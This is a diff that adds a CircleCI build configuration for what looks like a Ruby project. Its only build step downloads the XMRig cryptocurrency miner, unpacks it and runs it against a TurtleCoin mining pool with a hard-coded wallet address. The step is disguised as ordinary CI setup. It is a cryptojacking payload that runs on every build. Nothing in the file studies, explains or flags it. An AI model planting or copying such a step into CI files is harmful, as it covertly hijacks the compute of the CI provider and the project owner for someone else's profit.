@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar -xf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLuyhYoDm9DUCzP2jM646GLEPYXgayiGCPMuXaVQEcZFfaahS22p8gMLJVTf71ayR82yeTqk7RhNfA7p2vznkW6vBKAS5s1ME -p cpu -a argon2/chukwav2 -k
